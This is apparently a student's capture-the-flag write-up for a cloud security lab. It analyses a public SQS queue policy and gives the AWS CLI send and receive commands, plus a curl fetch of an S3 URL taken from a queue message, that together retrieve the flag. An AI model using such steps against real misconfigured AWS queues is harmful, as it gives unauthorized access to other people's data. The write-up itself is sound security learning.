# copy the contents of sample.md to start
# Challenge number : 2

## Challenge Statement:
Google Analytics:
We created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong?

Join our queue and get the secret flag. 

## IAM Policy
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}

### write a short analysis about the IAM policy here
From the above policy, We can see that any body can send and receive sqs message  

* What do I have access to?
	Any user can use the sqs queue
* What don't I have access to?
	N/A
* What do I find interesting?
SQS queue is open to public for sending and receiving message


## Solution

We can send and receive a message using sqs queue :

aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 --message-body "Lab 2"

aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2

The message contains the following:

{
    "Messages": [
        {
            "MessageId": "a69f4e6d-7ccd-4a5e-8cbc-b8ef26a92f8a",
            "ReceiptHandle": "AQEBsL3k+idLUm0ep9MTbeETVClJnUg09e96hZRD4adx7sNK3e1lVMY/CrtdBwhKiae+EOSls78lj9CcuqdgZYuullWn1i0R6DICZAgc6rB+3IIuVdVty1/SCdVi5Z2F+XDCZbZjpmAPcCMx5OfjNIPZv6TZg9
U8CxFdY/IDiZSz6mDhQlG5RnCjlzK1e4wFNuxU5tpUV9uJVnU8zJTwB2SBZNnVTtU2NPWM1tJvtxQfg/SxLzlrBTN44sXpNDkFnkM+DYBmX3cr+Sb6OIKKr7ViYuFXLXZjdiM7sldwb7EnxYBRtuIVcITOb9/5kmacVr3yrebmgTaaGnwVjudA6qRpak
FGI/hnOKSsfagptzcLbuYMv6tfwSWs0MurC/Vc2W36Og3czSnB/X9jzOat0ELwz4uV+MI124WRoApKF++ZkMw=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\",
 \"IsAdmin\": true}"
        }
    ]
}

Then if we curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
then we will get the content of the html file which is the flag in this challenge


## Reflection
* What was your approach?
	Sending and receiving the message
* What was the biggest challenge?
   Need to under the SQS service in AWS
* How did you overcome the challenges?
	I have some SQS knowledge from previous semester
* What led to the break through?
	The message contains an url which may contain the flag
* On the blue side, how can the learning be used to properly defend the important assets? 
	Learning should focus on identifying the assets, security controls and best practices etc.
